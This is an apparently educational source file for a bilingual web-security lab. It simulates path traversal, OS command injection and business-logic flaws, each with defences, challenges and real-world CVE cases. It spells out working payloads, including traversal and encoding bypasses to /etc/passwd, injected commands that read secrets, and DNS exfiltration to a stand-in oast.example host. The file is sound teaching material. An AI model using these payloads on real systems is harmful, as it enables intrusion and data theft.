import { L, decodeOnce, parseReq, verdict } from './lib.js';

const neutral = (en, zh) => ({ verdict: 'neutral', message: L(en, zh) });

/* ====================================================== Path traversal */
const FILES = {
  '/var/www/images/21.jpg': '(JPEG bytes)',
  '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ncarlos:x:12002:12002::/home/carlos:/bin/bash',
  '/var/www/app/config.yml': 'db:\n  host: 10.0.4.12\n  user: shop\n  password: Tr4versal-0k!',
};
const BASE = '/var/www/images/';

/** Resolve like a filesystem: dot segments, and a NUL byte cuts the string (old C-backed runtimes). */
function resolvePath(p) {
  const nul = p.indexOf('\0');
  const cut = nul >= 0 ? p.slice(0, nul) : p;
  const out = [];
  for (const seg of cut.split('/')) {
    if (seg === '' || seg === '.') continue;
    if (seg === '..') out.pop();
    else out.push(seg);
  }
  return '/' + out.join('/');
}
const readFile = (full) => (FILES[full] !== undefined ? `HTTP/1.1 200 OK\n\n${FILES[full]}` : 'HTTP/1.1 400 "No such file"');
const imgReq = (f) => `GET /image?filename=${f} HTTP/1.1`;
const CANON = { label: L('Validation', '校验'), off: L('As shown', '如左所示'), on: L('Canonicalise + prefix check', '规范化 + 前缀检查') };

function ptLab(def, presets, label, transform, takeaway) {
  return {
    fields: [{ id: 'f', label: L(`filename (${label.en})`, `filename（${label.zh}）`), default: def }],
    presets,
    defense: CANON,
    run({ values, defended }) {
      const request = imgReq(values.f);
      const t = transform(values.f);
      if (t.blocked) return { request, log: t.log, response: 'HTTP/1.1 400 "Invalid filename"', ...neutral('The check caught it.', '被检查拦住了。') };
      const full = resolvePath(t.path);
      const log = [...t.log, L(`opens ${full}`, `打开 ${full}`)];
      if (defended && !full.startsWith(BASE)) return { request, log: [...t.log, L(`🛡 canonical path ${full} is outside ${BASE}`, `🛡 规范化后的路径 ${full} 不在 ${BASE} 内`)], response: 'HTTP/1.1 400 "Invalid filename"', ...verdict(false, 'Resolve first, then check. No spelling gets out.', '先解析再检查，怎么写都出不去。') };
      return { request, log, response: readFile(full), ...(full.startsWith(BASE) ? neutral('Inside the images folder.', '仍在图片目录内。') : verdict(true, `Read ${full}.`, `读取了 ${full}。`)) };
    },
    takeaway,
  };
}

const pathTraversal = {
  variants: [
    {
      id: 'basic',
      title: L('Plain ../ sequences', '普通的 ../'),
      summary: L('The filename is appended to /var/www/images/. Each ../ climbs one directory.', '文件名被拼接在 /var/www/images/ 之后。每个 ../ 向上爬一层目录。'),
      lab: ptLab('../../../etc/passwd', [{ label: '21.jpg', values: { f: '21.jpg' } }, { label: '../../../etc/passwd', values: { f: '../../../etc/passwd' } }], L('no checks', '无检查'), (f) => ({ path: BASE + f, log: [`path = "${BASE}" + "${f}"`] })),
    },
    {
      id: 'absolute',
      title: L('Absolute path', '绝对路径'),
      summary: L('The app blocks ../ but joins paths with a function that discards the base when the second part is absolute (Python’s os.path.join, Node’s path.resolve).', '应用拦截了 ../，但拼接路径用的函数在第二部分是绝对路径时会丢弃基础目录（Python 的 os.path.join、Node 的 path.resolve）。'),
      lab: ptLab('/etc/passwd', [{ label: '../../../etc/passwd', values: { f: '../../../etc/passwd' } }, { label: '/etc/passwd', values: { f: '/etc/passwd' } }], L('blocks ../', '拦截 ../'), (f) => (f.includes('../') ? { blocked: true, log: [L('contains ../ → blocked', '包含 ../ → 拦截')] } : { path: f.startsWith('/') ? f : BASE + f, log: [`os.path.join("${BASE}", "${f}")`] })),
    },
    {
      id: 'stripped',
      title: L('Stripped once', '只删除一次'),
      summary: L('The app removes ../ from the input, but only in a single pass. ....// becomes ../ after the inner ../ is removed.', '应用会把输入里的 ../ 删除，但只删一遍。....// 在中间的 ../ 被删掉后，就变成了 ../。'),
      lab: ptLab('....//....//....//etc/passwd', [{ label: '../../../etc/passwd', values: { f: '../../../etc/passwd' } }, { label: '....//', values: { f: '....//....//....//etc/passwd' } }], L('removes ../ once', '删除一次 ../'), (f) => {
        const s = f.split('../').join('');
        return { path: BASE + s, log: [L(`after stripping: ${s}`, `删除后：${s}`)] };
      }),
    },
    {
      id: 'encoded',
      title: L('URL-encoded', 'URL 编码'),
      summary: L('A WAF or the app rejects ../, then the value is URL-decoded again later. Encode the slash (..%2f), or double-encode (..%252f) if one decode happens before the check.', 'WAF 或应用会拒绝 ../，但之后又对值做了一次 URL 解码。把斜杠编码（..%2f），如果检查前已经解码过一次，就双重编码（..%252f）。'),
      lab: ptLab('..%2f..%2f..%2fetc/passwd', [{ label: '../', values: { f: '../../../etc/passwd' } }, { label: '..%2f', values: { f: '..%2f..%2f..%2fetc/passwd' } }], L('blocks ../, then decodes', '拦截 ../，然后再解码'), (f) => (f.includes('../') ? { blocked: true, log: [L('contains ../ → blocked', '包含 ../ → 拦截')] } : { path: BASE + decodeOnce(f), log: [L(`decoded: ${decodeOnce(f)}`, `解码后：${decodeOnce(f)}`)] })),
    },
    {
      id: 'prefix',
      title: L('Required prefix', '必须带的前缀'),
      summary: L('The app insists the filename starts with /var/www/images. Start with it, then climb out.', '应用要求文件名以 /var/www/images 开头。那就以它开头，然后再爬出去。'),
      lab: ptLab('/var/www/images/../../../etc/passwd', [{ label: '/etc/passwd', values: { f: '/etc/passwd' } }, { label: L('prefix + ../', '前缀 + ../'), values: { f: '/var/www/images/../../../etc/passwd' } }], L('must start with /var/www/images', '必须以 /var/www/images 开头'), (f) => (!f.startsWith('/var/www/images') ? { blocked: true, log: [L('wrong prefix → blocked', '前缀不对 → 拦截')] } : { path: f, log: [L('prefix ok', '前缀正确')] })),
    },
    {
      id: 'nullbyte',
      title: L('Required extension + null byte', '必须带的扩展名 + 空字节'),
      summary: L('The filename must end in .jpg. In older runtimes that pass strings to C APIs, %00 ends the string, so the check sees .jpg and the file system doesn’t.', '文件名必须以 .jpg 结尾。在把字符串交给 C 接口的老运行时里，%00 会截断字符串：检查看到的是 .jpg，文件系统看不到。'),
      lab: ptLab('../../../etc/passwd%00.jpg', [{ label: '../../../etc/passwd', values: { f: '../../../etc/passwd' } }, { label: '%00.jpg', values: { f: '../../../etc/passwd%00.jpg' } }], L('must end with .jpg', '必须以 .jpg 结尾'), (f) => {
        const d = decodeOnce(f);
        return !d.endsWith('.jpg') ? { blocked: true, log: [L('does not end with .jpg → blocked', '不以 .jpg 结尾 → 拦截')] } : { path: BASE + d, log: [L('ends with .jpg ✓ ; C layer stops at the NUL byte', '以 .jpg 结尾 ✓；C 层在 NUL 字节处截断')] };
      }),
      takeaway: L('Modern runtimes reject NUL bytes in paths, but the lesson stands: validate the resolved path, not the string.', '现代运行时会拒绝路径中的 NUL 字节，但道理不变：校验解析后的路径，而不是字符串。'),
    },
  ],
  challenges: [
    {
      title: L('Beat the single-pass filter', '击败单次过滤'),
      goal: L('The app strips “../” from filename once, then reads /var/www/images/ + filename. Read /etc/passwd.', '应用会把 filename 中的“../”删除一次，然后读取 /var/www/images/ + filename。读取 /etc/passwd。'),
      fields: [{ id: 'f', label: 'filename', default: '../../../etc/passwd' }],
      run({ f }) {
        const s = f.split('../').join('');
        const full = resolvePath(BASE + s);
        return { log: [L(`after stripping: ${s}`, `删除后：${s}`), L(`opens ${full}`, `打开 ${full}`)], response: readFile(full), full };
      },
      check: (v, o) => o.full === '/etc/passwd',
      hint: L('Write something that turns into ../ after ../ is removed from its middle.', '写出一个从中间删掉 ../ 之后会变成 ../ 的东西。'),
      solution: '....//....//....//etc/passwd',
      explain: L('Removing a pattern once lets the remaining characters join into the pattern again. Never repair input; reject it or canonicalise and check.', '只删一次某个模式，剩下的字符又会拼成这个模式。永远不要“修补”输入：要么拒绝，要么规范化之后再检查。'),
    },
    {
      title: L('Prefix and extension', '前缀与扩展名'),
      goal: L('filename must start with /var/www/images and end with .jpg (checked after URL-decoding). The file layer is C-based. Read /etc/passwd.', 'filename 必须以 /var/www/images 开头、以 .jpg 结尾（在 URL 解码后检查）。文件层基于 C。读取 /etc/passwd。'),
      fields: [{ id: 'f', label: 'filename', default: '/var/www/images/21.jpg' }],
      run({ f }) {
        const d = decodeOnce(f);
        if (!d.startsWith('/var/www/images')) return { log: [L('wrong prefix', '前缀不对')], response: 'HTTP/1.1 400 "Invalid filename"', full: '' };
        if (!d.endsWith('.jpg')) return { log: [L('wrong extension', '扩展名不对')], response: 'HTTP/1.1 400 "Invalid filename"', full: '' };
        const full = resolvePath(d);
        return { log: [L(`opens ${full}`, `打开 ${full}`)], response: readFile(full), full };
      },
      check: (v, o) => o.full === '/etc/passwd',
      hint: L('Combine the prefix trick with a %00 before .jpg.', '把前缀技巧和 .jpg 前的 %00 结合起来。'),
      solution: '/var/www/images/../../../etc/passwd%00.jpg',
      explain: L('Both checks looked at the string; neither looked at where the path actually led. Resolve to a canonical path and compare that with the allowed directory.', '两个检查都只看了字符串，没有一个关心路径最终通向哪里。把路径解析成规范路径，再和允许的目录比较。'),
    },
    {
      title: L('Steal the database password', '偷出数据库密码'),
      goal: L('The framework URL-decodes the parameter, the app rejects anything containing ../, then decodes again before opening /var/www/images/ + filename. The app’s config is /var/www/app/config.yml. Type the database password below.', '框架会 URL 解码参数，应用拒绝任何包含 ../ 的值，然后在打开 /var/www/images/ + filename 之前再解码一次。应用配置文件是 /var/www/app/config.yml。在下方输入数据库密码。'),
      fields: [
        { id: 'f', label: L('filename (as sent in the URL)', 'filename（URL 中发送的原样）'), default: '../../app/config.yml' },
        { id: 'a', label: L('Database password', '数据库密码'), default: '' },
      ],
      run({ f, a }) {
        const once = decodeOnce(f);
        if (once.includes('../')) return { log: [L(`after framework decode: ${once} → contains ../, blocked`, `框架解码后：${once} → 包含 ../，拦截`)], response: 'HTTP/1.1 400 "Invalid filename"' };
        const full = resolvePath(BASE + decodeOnce(once));
        return { log: [L(`after framework decode: ${once}`, `框架解码后：${once}`), L(`app decodes again, opens ${full}`, `应用再次解码，打开 ${full}`), a ? (a === 'Tr4versal-0k!' ? L('✓ password correct', '✓ 密码正确') : L('✗ wrong password', '✗ 密码不对')) : ''].filter(Boolean), response: readFile(full) };
      },
      check: (v) => v.a.trim() === 'Tr4versal-0k!',
      hint: L('Two decodes happen, and the check sits between them. Encode the slash twice: / → %2f → %252f.', '一共解码两次，检查夹在中间。把斜杠编码两次：/ → %2f → %252f。'),
      solution: '..%252f..%252fapp/config.yml  →  Tr4versal-0k!',
      explain: L('Every decode after a check reopens the hole. Decode once, at the edge, then canonicalise and check the final path.', '在检查之后每多解码一次，就重新打开一次漏洞。在入口处只解码一次，然后规范化，并检查最终路径。'),
    },
  ],
  cases: [
    { year: '2021', ref: 'CVE-2021-41773', title: L('Apache HTTP Server 2.4.49', 'Apache HTTP Server 2.4.49'), what: L('A change to path normalisation in Apache 2.4.49 let encoded dot segments (.%2e/) escape the document root when access to files outside it was not explicitly denied. With CGI enabled it led to remote code execution. It was exploited quickly, and the first fix in 2.4.50 was incomplete (CVE-2021-42013).', 'Apache 2.4.49 对路径规范化的一处改动，使得在未显式拒绝访问文档根目录之外文件的情况下，编码后的点号段（.%2e/）可以逃出文档根目录。如果启用了 CGI，还能导致远程代码执行。该漏洞很快被利用，而 2.4.50 中的首次修复并不完整（CVE-2021-42013）。'), lesson: L('Even mature web servers get path normalisation wrong; defence in depth (deny-all outside docroot) matters.', '即使是成熟的 Web 服务器也会在路径规范化上出错；纵深防御（文档根目录之外一律拒绝）很重要。') },
    { year: '2019', ref: 'CVE-2018-13379', title: L('Fortinet FortiOS SSL VPN', 'Fortinet FortiOS SSL VPN'), what: L('A path traversal in the FortiOS SSL VPN web portal let unauthenticated attackers download system files, including a session file containing VPN users’ plaintext credentials. Lists of affected devices and stolen credentials were later published online.', 'FortiOS SSL VPN 网页门户中的一个路径遍历漏洞，允许未经认证的攻击者下载系统文件，其中包括一个含有 VPN 用户明文凭证的会话文件。受影响设备的列表和被盗凭证后来被公开发布到网上。'), lesson: L('A file-read bug on an edge device can hand over the keys to the whole network.', '边界设备上的一个文件读取漏洞，就可能交出整个网络的钥匙。') },
  ],
};

/* ====================================================== OS command injection */
const SHELL_FILES = { '/home/carlos/secret': 'Zq8Lm2Vt' };
/** A tiny shell: supports ; && || | & newline, $(…) and `…`, and a handful of commands. */
function sh(cmdline, fs = {}) {
  let delay = 0;
  const dns = [];
  const subst = (s) => s.replace(/\$\(([^)]*)\)|`([^`]*)`/g, (_, a, b) => run1((a ?? b).trim()).out.trim());
  function run1(c) {
    // Split off a "> file" redirect wherever it appears, with or without spaces.
    const line = subst(c).trim();
    const m = /^(.*?)\s*>\s*(\S+)\s*$/.exec(line);
    const target = m ? m[2] : null;
    const [cmd, ...a] = (m ? m[1] : line).split(/\s+/);
    let out = '';
    let code = 0;
    switch (cmd || '') {
      case '':
        break;
      case 'whoami':
        out = 'www-data\n';
        break;
      case 'id':
        out = 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n';
        break;
      case 'cat':
        out = a.map((f) => SHELL_FILES[f] ?? fs[f] ?? `cat: ${f}: No such file or directory`).join('\n') + '\n';
        break;
      case 'sleep':
        delay += Number(a[0]) || 0;
        break;
      case 'ping': {
        const ci = a.indexOf('-c');
        const n = ci >= 0 ? Number(a[ci + 1]) || 1 : 1;
        const host = a.filter((x, i) => x !== '-c' && i !== ci + 1)[0] || '';
        if (/^[\w.-]+$/.test(host) && host !== 'x') {
          delay += Math.max(n - 1, 0);
          out = `PING ${host}: ${n} packets transmitted, ${n} received\n`;
        } else {
          out = `ping: ${host}: Name or service not known\n`;
          code = 2;
        }
        break;
      }
      case 'nslookup':
      case 'dig':
        dns.push(a[a.length - 1]);
        out = a[a.length - 1]?.endsWith('.oast.example') ? '' : `** server can't find ${a[a.length - 1]}: NXDOMAIN\n`;
        break;
      case 'echo':
        out = a.join(' ') + '\n';
        break;
      default:
        out = `sh: 1: ${cmd}: not found\n`;
        code = 127;
    }
    if (target) {
      fs[target] = out;
      out = '';
    }
    return { out, code };
  }
  // split on separators, honouring && and ||
  const parts = cmdline.split(/(\|\||&&|;|\n|\||&)/);
  let output = '';
  let last = { code: 0 };
  let op = ';';
  for (let i = 0; i < parts.length; i += 2) {
    const c = parts[i];
    const skip = (op === '&&' && last.code !== 0) || (op === '||' && last.code === 0);
    if (!skip && c.trim()) {
      last = run1(c);
      output += last.out;
    } else if (!skip && !c.trim() && op !== ';') last = { code: 0 };
    op = parts[i + 1] || ';';
  }
  return { output, delay, dns, fs };
}

const NO_SHELL = { label: L('Execution', '执行方式'), off: L('Through a shell', '经过 shell'), on: L('execFile, no shell', 'execFile，不经过 shell') };
const cmdi = {
  variants: [
    {
      id: 'chain',
      title: L('Command chaining', '命令拼接'),
      summary: L('Shell metacharacters ; && || | & and newlines end one command and start another.', 'Shell 元字符 ; && || | & 以及换行，会结束一个命令并开启另一个。'),
      lab: {
        fields: [{ id: 'h', label: L('host', 'host 参数'), default: '8.8.8.8; cat /home/carlos/secret' }],
        presets: [
          { label: '8.8.8.8', values: { h: '8.8.8.8' } },
          { label: '; whoami', values: { h: '8.8.8.8; whoami' } },
          { label: '&& id', values: { h: '8.8.8.8 && id' } },
          { label: '|| cat', values: { h: 'x || cat /home/carlos/secret' } },
        ],
        defense: NO_SHELL,
        run({ values, defended }) {
          const cmd = `ping -c 1 ${values.h}`;
          const request = `POST /network/ping\n\nhost=${values.h}`;
          if (defended) return { request, log: [`execFile("ping", ["-c", "1", ${JSON.stringify(values.h)}])`], response: /^[\w.-]+$/.test(values.h) ? `PING ${values.h}: 1 packets transmitted, 1 received` : `ping: ${values.h}: Name or service not known`, ...verdict(false, 'One argument, no shell to interpret ; or &&.', '只是一个参数，没有 shell 去解释 ; 或 &&。') };
          const r = sh(cmd);
          const extra = r.output.split('\n').filter((l) => l && !l.startsWith('PING') && !l.startsWith('ping:')).length;
          return { request, log: [`sh -c "${cmd}"`], response: r.output, ...(extra ? verdict(true, 'A second command ran as www-data.', '第二个命令以 www-data 身份运行了。') : neutral('Just ping.', '只是 ping。')) };
        },
      },
    },
    {
      id: 'blind-time',
      title: L('Blind: time delay', '盲注：时间延迟'),
      summary: L('The output is never shown. Make the command take longer and measure the response time.', '输出永远不会显示。让命令多跑一会儿，测量响应时间。'),
      lab: {
        fields: [{ id: 'e', label: L('email (passed to a mail script)', 'email（传给邮件脚本）'), default: 'x||ping -c 10 127.0.0.1||' }],
        presets: [
          { label: L('Normal', '正常'), values: { e: 'me@example.com' } },
          { label: 'ping -c 10', values: { e: 'x||ping -c 10 127.0.0.1||' } },
          { label: 'sleep 5', values: { e: 'x; sleep 5 #' } },
        ],
        defense: NO_SHELL,
        run({ values, defended }) {
          const request = `POST /feedback\n\nemail=${values.e}&message=hi`;
          if (defended) return { request, log: ['execFile("mail", ["-s", "Feedback", email])'], response: 'HTTP/1.1 200 OK  (90 ms)\n\n{}', ...verdict(false, 'No shell, no extra commands.', '没有 shell，就没有额外命令。') };
          const r = sh(`mail -s Feedback ${values.e.replace(/#.*$/, '')}`);
          const ms = 90 + r.delay * 1000;
          return { request, log: [`sh -c "mail -s Feedback ${values.e}"`], response: `HTTP/1.1 200 OK  (${ms} ms)\n\n{}`, ...(r.delay >= 3 ? verdict(true, `A ${r.delay}s delay: your command ran.`, `${r.delay} 秒延迟：你的命令被执行了。`) : neutral('Instant response.', '立即响应。')) };
        },
      },
    },
    {
      id: 'redirect',
      title: L('Blind: output redirection', '盲注：输出重定向'),
      summary: L('Write the command’s output into a folder the web server serves, then fetch it.', '把命令的输出写进 Web 服务器对外提供的目录，再去取回来。'),
      lab: {
        fields: [{ id: 'e', label: 'email', default: 'x||whoami>/var/www/images/o.txt||' }],
        presets: [{ label: L('whoami > file', 'whoami > 文件'), values: { e: 'x||whoami>/var/www/images/o.txt||' } }],
        defense: NO_SHELL,
        run({ values, defended }) {
          const request = `1) POST /feedback  email=${values.e}\n2) GET /image?filename=o.txt`;
          if (defended) return { request, log: [], response: 'HTTP/1.1 400 "No such file"', ...verdict(false, 'Nothing was written.', '什么也没写进去。') };
          const r = sh(`mail -s Feedback ${values.e}`);
          const out = r.fs['/var/www/images/o.txt'];
          return { request, log: [L(out !== undefined ? 'file written to /var/www/images/o.txt' : 'no file written', out !== undefined ? '文件写入 /var/www/images/o.txt' : '没有写入文件')], response: out !== undefined ? `HTTP/1.1 200 OK\n\n${out}` : 'HTTP/1.1 400 "No such file"', ...(out ? verdict(true, 'Blind output, recovered.', '盲注的输出被取回来了。') : neutral('Nothing to fetch.', '没有可取的文件。')) };
        },
      },
    },
    {
      id: 'oob',
      title: L('Blind: out-of-band', '盲注：带外'),
      summary: L('Make the server look up a domain you control. Put the data in the subdomain: `whoami`.you.oast.example.', '让服务器解析一个你控制的域名，把数据放进子域名里：`whoami`.you.oast.example。'),
      lab: {
        fields: [{ id: 'e', label: 'email', default: 'x||nslookup `whoami`.k3x9.oast.example||' }],
        presets: [
          { label: 'nslookup', values: { e: 'x||nslookup k3x9.oast.example||' } },
          { label: L('with data', '带数据'), values: { e: 'x||nslookup `whoami`.k3x9.oast.example||' } },
        ],
        defense: NO_SHELL,
        run({ values, defended }) {
          const request = `POST /feedback\n\nemail=${values.e}`;
          if (defended) return { request, log: [], response: 'HTTP/1.1 200 OK', ...verdict(false, 'No lookup happened.', '没有发生任何 DNS 查询。') };
          const r = sh(`mail -s Feedback ${values.e}`);
          const hit = r.dns.find((d) => d?.endsWith('.oast.example'));
          return { request, log: hit ? [L(`📡 your DNS server: query for ${hit}`, `📡 你的 DNS 服务器：收到 ${hit} 的查询`)] : [], response: 'HTTP/1.1 200 OK', ...(hit ? verdict(true, hit.split('.')[0] === 'www-data' ? 'The username arrived inside the DNS query.' : 'Proof of execution. Now add data to the subdomain.', hit.split('.')[0] === 'www-data' ? '用户名随 DNS 查询一起到达了。' : '证明了命令执行。现在把数据加进子域名。') : neutral('No callback.', '没有回连。')) };
        },
      },
    },
    {
      id: 'quoted',
      title: L('Inside double quotes', '在双引号里'),
      summary: L('Wrapping input in "…" stops ; and &, but the shell still expands $(…) and backticks inside double quotes.', '用 "…" 包住输入能挡住 ; 和 &，但 shell 仍会在双引号内展开 $(…) 和反引号。'),
      lab: {
        fields: [{ id: 'd', label: 'domain', default: '$(whoami)' }],
        presets: [
          { label: 'example.com; id', values: { d: 'example.com; id' } },
          { label: '$(whoami)', values: { d: '$(whoami)' } },
        ],
        defense: NO_SHELL,
        run({ values, defended }) {
          const request = `GET /lookup?domain=${values.d}`;
          if (defended) return { request, log: [`execFile("nslookup", [${JSON.stringify(values.d)}])`], response: `** server can't find ${values.d}: NXDOMAIN`, ...verdict(false, '$(…) is just characters to nslookup.', '对 nslookup 来说 $(…) 只是普通字符。') };
          const inner = /^[^"]*$/.test(values.d) ? values.d.replace(/\$\(([^)]*)\)|`([^`]*)`/g, (_, a, b) => sh(a ?? b).output.trim()) : values.d;
          return { request, log: [`sh -c 'nslookup "${values.d}"'`, inner !== values.d ? L(`expanded to: ${inner}`, `展开为：${inner}`) : L('no expansion', '没有展开')], response: `** server can't find ${inner}: NXDOMAIN`, ...(inner !== values.d ? verdict(true, 'Command substitution ran inside the quotes.', '命令替换在引号里照样执行了。') : neutral('; stays inside the quotes.', '; 被困在引号里。')) };
        },
      },
      takeaway: L('Quoting is not escaping. The only robust fix is not to use a shell.', '加引号不等于转义。唯一可靠的修复是不使用 shell。'),
    },
  ],
  challenges: [
    {
      title: L('Prove it blind', '盲证'),
      goal: L('Your input lands in sh -c "mail -s Feedback EMAIL". Nothing is ever shown. Make the response take at least 10 seconds.', '你的输入会进入 sh -c "mail -s Feedback EMAIL"。什么都不会显示。让响应至少耗时 10 秒。'),
      fields: [{ id: 'e', label: 'email', default: 'me@example.com' }],
      run({ e }) {
        const r = sh(`mail -s Feedback ${e}`);
        return { log: [], response: `HTTP/1.1 200 OK  (${90 + r.delay * 1000} ms)`, r };
      },
      check: (v, o) => o.r.delay >= 10,
      hint: L('End the mail command with a separator, then run something slow: sleep, or ping with a count.', '用分隔符结束 mail 命令，然后运行一个慢的命令：sleep，或带次数的 ping。'),
      solution: 'x||ping -c 11 127.0.0.1||',
      explain: L('|| runs the next command if the previous one failed, and the trailing || swallows whatever the script appends. Time is a side channel that needs no output at all.', '|| 会在前一个命令失败时执行下一个，末尾的 || 则吞掉脚本追加的内容。时间是一种完全不需要输出的侧信道。'),
    },
    {
      title: L('Quotes won’t save you', '引号救不了你'),
      goal: L('The app runs sh -c \'nslookup "DOMAIN"\' and blocks ; & | and newlines. Make it print the output of whoami.', '应用执行 sh -c \'nslookup "DOMAIN"\'，并拦截 ; & | 和换行。让它打印出 whoami 的输出。'),
      fields: [{ id: 'd', label: 'domain', default: 'example.com; whoami' }],
      run({ d }) {
        if (/[;&|\n]/.test(d)) return { log: [L('🛡 blocked character', '🛡 含有被拦截的字符')], response: 'HTTP/1.1 400 "Invalid domain"' };
        if (d.includes('"')) return { log: [L('quote closes the string: syntax error', '引号闭合了字符串：语法错误')], response: 'sh: 1: Syntax error: Unterminated quoted string' };
        const inner = d.replace(/\$\(([^)]*)\)|`([^`]*)`/g, (_, a, b) => sh(a ?? b).output.trim());
        return { log: [`sh -c 'nslookup "${d}"'`], response: `** server can't find ${inner}: NXDOMAIN` };
      },
      check: (v, o) => o.response.includes('www-data'),
      hint: L('Which shell features still work inside double quotes?', '在双引号里，shell 的哪些功能仍然有效？'),
      solution: '$(whoami)',
      explain: L('Double quotes still allow $(…), backticks and $VAR expansion. Blocklisting characters is fragile; passing arguments without a shell is not.', '双引号里依然允许 $(…)、反引号和 $VAR 展开。字符黑名单很脆弱；不经过 shell 传递参数才可靠。'),
    },
    {
      title: L('Exfiltrate through a file', '借文件带出数据'),
      goal: L('Blind injection in the email field (sh -c "mail -s Feedback EMAIL"). Images are served from /var/www/images/ via /image?filename=. Read /home/carlos/secret.', 'email 字段存在盲注（sh -c "mail -s Feedback EMAIL"）。图片通过 /image?filename= 从 /var/www/images/ 提供。读取 /home/carlos/secret。'),
      fields: [
        { id: 'e', label: L('1) email', '1) email'), default: 'me@example.com' },
        { id: 'f', label: L('2) then GET /image?filename=', '2) 然后 GET /image?filename='), default: '21.jpg' },
      ],
      run({ e, f }) {
        const r = sh(`mail -s Feedback ${e}`);
        const file = r.fs[`/var/www/images/${f}`];
        return { log: Object.keys(r.fs).map((k) => L(`file written: ${k}`, `写入了文件：${k}`)), response: file !== undefined ? `HTTP/1.1 200 OK\n\n${file}` : 'HTTP/1.1 400 "No such file"', file };
      },
      check: (v, o) => (o.file || '').includes('Zq8Lm2Vt'),
      hint: L('cat the secret with > into /var/www/images/something.txt, then request that filename.', '用 cat 读取 secret，再用 > 写到 /var/www/images/something.txt，然后请求这个文件名。'),
      solution: 'x||cat /home/carlos/secret>/var/www/images/s.txt||   then   s.txt',
      explain: L('When output is hidden, find any channel the attacker can read: a served folder, DNS, or timing.', '当输出被隐藏时，就去找攻击者能读到的任何通道：对外提供的目录、DNS，或者时间。'),
    },
  ],
  cases: [
    { year: '2014', ref: 'CVE-2014-6271', title: L('Shellshock', 'Shellshock（破壳漏洞）'), what: L('Bash executed commands that followed a function definition stored in an environment variable. Web servers using CGI copy headers such as User-Agent into environment variables, so a single crafted header could run commands on the server. Mass scanning began within days.', 'Bash 会执行环境变量中函数定义之后附带的命令。使用 CGI 的 Web 服务器会把 User-Agent 等请求头复制到环境变量里，于是一个精心构造的请求头就能在服务器上执行命令。几天之内就出现了大规模扫描。'), lesson: L('Any path from request data into a shell, even indirect ones, is command injection.', '任何从请求数据通往 shell 的路径，即使是间接的，都是命令注入。') },
    { year: '2024', ref: 'CVE-2024-3400', title: L('Palo Alto PAN-OS GlobalProtect', 'Palo Alto PAN-OS GlobalProtect'), what: L('A command injection in the GlobalProtect feature of PAN-OS firewalls let unauthenticated attackers run code as root. It was exploited as a zero-day before a patch existed and was rated CVSS 10.0.', 'PAN-OS 防火墙 GlobalProtect 功能中的一个命令注入漏洞，允许未经认证的攻击者以 root 身份执行代码。它在补丁发布前就被当作零日漏洞利用，CVSS 评分为 10.0。'), lesson: L('Security appliances are web apps too, and sit right on the edge.', '安全设备本身也是 Web 应用，而且就站在网络边界上。') },
  ],
};

/* ====================================================== Business logic */
const JACKET = 133700;
const money = (c) => `$${(c / 100).toFixed(2)}`;
const int32 = (x) => {
  let v = x % 4294967296;
  if (v >= 2147483648) v -= 4294967296;
  if (v < -2147483648) v += 4294967296;
  return v;
};
function applyCoupons(list, { strict = false } = {}) {
  const COUP = { NEWCUST5: (t) => t - 500, SIGNUP30: (t) => t - Math.round(JACKET * 0.3) };
  let total = JACKET;
  const log = [];
  let last = null;
  const used = new Set();
  for (const raw of list) {
    const c = raw.trim().toUpperCase();
    if (!c) continue;
    if (!COUP[c]) {
      log.push(L(`${c}: invalid`, `${c}：无效`));
      continue;
    }
    if (strict ? used.has(c) : c === last) {
      log.push(L(`${c}: already applied`, `${c}：已使用过`));
      continue;
    }
    total = Math.max(COUP[c](total), 0);
    log.push(L(`${c} applied → ${money(total)}`, `已使用 ${c} → ${money(total)}`));
    last = c;
    used.add(c);
  }
  return { total, log };
}

const logic = {
  variants: [
    {
      id: 'price',
      title: L('Trusting client-side prices', '信任客户端价格'),
      summary: L('The add-to-cart form sends the price as a hidden field, and the server uses it.', '加入购物车的表单把价格作为隐藏字段发送，而服务器直接用了它。'),
      lab: {
        fields: [{ id: 'p', label: L('price (cents, hidden field)', 'price（分，隐藏字段）'), default: '1' }],
        presets: [
          { label: '133700', values: { p: '133700' } },
          { label: '1', values: { p: '1' } },
        ],
        defense: { label: L('Price source', '价格来源'), off: L('Request', '请求'), on: L('Product database', '商品数据库') },
        run({ values, defended }) {
          const p = defended ? JACKET : parseInt(values.p, 10) || 0;
          return { request: `POST /cart\n\nproductId=1&quantity=1&price=${values.p}`, log: [defended ? L('price looked up: 133700', '查询到价格：133700') : L(`price taken from request: ${p}`, `价格取自请求：${p}`)], response: `Cart: Lightweight jacket × 1 = ${money(p)}`, ...(p < JACKET ? verdict(true, 'The jacket is yours for almost nothing.', '这件夹克几乎白送给你了。') : defended ? verdict(false, 'The server ignores the price you send.', '服务器忽略你发送的价格。') : neutral('Full price.', '原价。')) };
        },
      },
    },
    {
      id: 'overflow',
      title: L('Integer overflow', '整数溢出'),
      summary: L('The total is stored in a 32-bit signed integer of cents. Past $21,474,836.47 it wraps around to a huge negative number.', '总价以“分”为单位存放在 32 位有符号整数里。超过 $21,474,836.47 就会回绕成一个巨大的负数。'),
      lab: {
        fields: [{ id: 'q', label: L('jacket quantity', '夹克数量'), default: '16062' }],
        presets: [
          { label: '1', values: { q: '1' } },
          { label: '16061', values: { q: '16061' } },
          { label: '16062', values: { q: '16062' } },
        ],
        defense: { label: L('Arithmetic', '运算'), off: 'int32', on: L('Checked / 64-bit + limits', '溢出检查 / 64 位 + 上限') },
        run({ values, defended }) {
          const q = Math.max(parseInt(values.q, 10) || 0, 0);
          if (defended) return { request: `POST /cart  quantity=${q}`, log: [L('🛡 quantity limit 99 per order', '🛡 每单数量上限 99')], response: q > 99 ? 'HTTP/1.1 400 "Invalid quantity"' : `Total: ${money(JACKET * q)}`, ...verdict(false, 'Totals can’t wrap.', '总价不会回绕。') };
          const t = int32(JACKET * q);
          return { request: `POST /cart  quantity=${q}`, log: [L(`133700 × ${q} = ${JACKET * q} → int32 ${t}`, `133700 × ${q} = ${JACKET * q} → int32 ${t}`)], response: `Total: ${money(t)}`, ...(t < 0 ? verdict(true, 'The total wrapped negative.', '总价回绕成了负数。') : neutral('Still positive.', '仍然是正数。')) };
        },
      },
    },
    {
      id: 'coupon',
      title: L('Alternating coupons', '交替使用优惠券'),
